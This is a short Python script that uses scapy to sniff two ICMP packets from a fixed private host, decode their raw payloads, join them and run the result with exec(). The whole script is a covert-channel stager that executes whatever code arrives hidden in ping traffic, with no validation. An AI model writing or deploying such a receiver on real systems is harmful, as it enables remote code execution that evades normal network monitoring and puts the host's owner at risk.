from scapy.all import *

fil = "src host 10.0.0.113 and icmp"
data_received = []
complete_payload = ""


def handle_data_received(packet):
    # decoded it from binary to str and removes the unicode escape characters
    data_received.append(packet[Raw].load.decode("unicode_escape"))


sniffed = sniff(filter=fil, prn=handle_data_received, count=2)
print(data_received)

exec("".join(data_received))
